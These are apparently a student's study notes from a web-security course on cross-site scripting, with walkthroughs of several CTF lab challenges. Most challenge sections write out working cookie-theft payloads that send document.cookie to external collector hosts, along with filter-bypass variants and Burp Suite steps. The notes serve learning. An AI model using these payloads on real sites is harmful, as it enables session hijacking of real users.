# XSS
* Cross-site scripting (XSS) is a web security vulnerability that allows attackers to inject malicious code into a user's browser.

## Part 1. Report
 
## Part 2. XSS
- Working on Web Browser: JavaScript
- Working location: victim's web browser

1. Stored XSS -> Save in the server
2. Reflected XSS -> rebound from Server
3. XSS, CSRF
4. Steal cookie by using JavaScript

```javascript
var cookieData = document.cookie;
var i = new Image();
  i.src = "HTTP://normaltic.attacker.com/
  i.src = "HTTP://normaltic.attacker.com/?cookie=" + "Secret_data";
  i.src = "HTTP://normaltic.attacker.com/?cookie=" + cookieData;
```

5. VPS or requestbin - https://public.requestbin.com/r/

6. XSS
   [Common XSS Errors](https://github.com/imnarendrabhati/testing-new/blob/master/%3CIMG%20SRC%3DX%20ONERROR:JAVASCRIPT:ALERT(1)%3B%3E)

1) CTF XSS 1
- [Similiar Example](https://portswigger.net/web-security/cross-site-scripting/contexts)
- Error = Input script
- Annoucement and create content "<script>alert(1)</script>" on the subject.
- When you click it, the alert shows up.
- Instead of alert(1), put
```javascript
var i = new Image(); i.src = "HTTP://en7riltg206nc.x.pipedream.net/getCrred.php?cookie=" + cookieData;
```
- In BurpSuite, instead of alert(1), put the below code
```javascript
var cookieData = document.cookie; 
var i = new Image();
i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
```
- On the admin visit url = type the address made by the attack post
- Check the flag on https://public.requestbin.com/

7. DOM Based XSS
- Create a tag by using JavaScript
- Create and execute a new script from a browser
- an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim's browser used by the original client-side script,
- document.write = "";
- innerHTML

## Part 3. Assignment
1. Review
2. XSS CTF <br>
a. CTF XSS 2
  - Error = Showing the direct sentence on HTML
```javascript
<script>alert('x에 대한 검색 결과가 존재하지 않습니다.');</script>
```
  - Check Attack statement on search bar
```javascript
xss');alert(1);var i=('
```
  - Check Attack
```javascript
xss');var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;var i=('
```
  - Send to repeater the POST URL to change GET method
  - Replace the Repeater on Burp Suite, working on the GET method instead of the POST method because the host gets the access
  - The GET URL inputs the admin visit URL bar
  - Check the flag on https://public.requestbin.com/

b. CTF XSS 3
  - Error = Showing ID on the URL on the personal information 
  - Check the attack possibility to change the ID on Burp Suite Request
  - Check the attack statement
```javascript
aaa"/><script>alert(1)</script>
```
  - Check the attack
```javascript
aaa"/><script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
```
  - Copy GET URL and input the URL on the admin visit bar
  - Check the flag on https://public.requestbin.com/

c. CTF XSS 4
  - Error = In the board, it is possible to use special characters (<'">).
  - Check the attack possibility of using an attack statement on the board.
```javascript
<script>alert(1)</script>
```
  - Filtering "script" and "alert", so using another attack statement
```javascript
<img src=x onerror=confirm(1)>
```
  - Check the attack
```javascript
<img src="https://x" onerror="location.href='http://enjt04rx79at.x.pipedream.net/?cookie=' + document.cookie;">
```
  - Block the long subject
  - Check the attack on the content box
  - Copy URL and input the URL on the admin visit bar
  - Check the flag on https://public.requestbin.com/

d. CTF XSS 5
  - Error = In the board, it is possible to use special characters (<'">), but it converts &lt;
  - Check the attack possibility of using an attack statement on the board
```javascript
<script>alert(1)</script>
```
  - Using the Burp Suite, the website should be intercepted step by step
  - Create a new post and forward
  - Check the attack statement
```javascript
<script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
```
  - During the intercept, change the filtered attack statement
  - Open the new post and copy the URL and input the URL on the admin visit bar
  - Check the flag on https://public.requestbin.com/

e. CTF XSS 6
  - Error = When you log in wrong, the alert pops up.
  - Check the attack possibility in the Burp Suite
  - The POST proxy sends to Repeater and changes the method to GET
  - Check special characters and it works
  - Check the attack statement
```javascript
+]');alert(1)//
```
  - Check the attack
```javascript
+]');location.href='http://enjt04rx79at.x.pipedream.net/?cookie='%2bdocument.cookie;//
```
  - Copy URL and input the URL on the admin visit bar
  - Check the flag on https://public.requestbin.com/

f. CTF XSS Challenge 
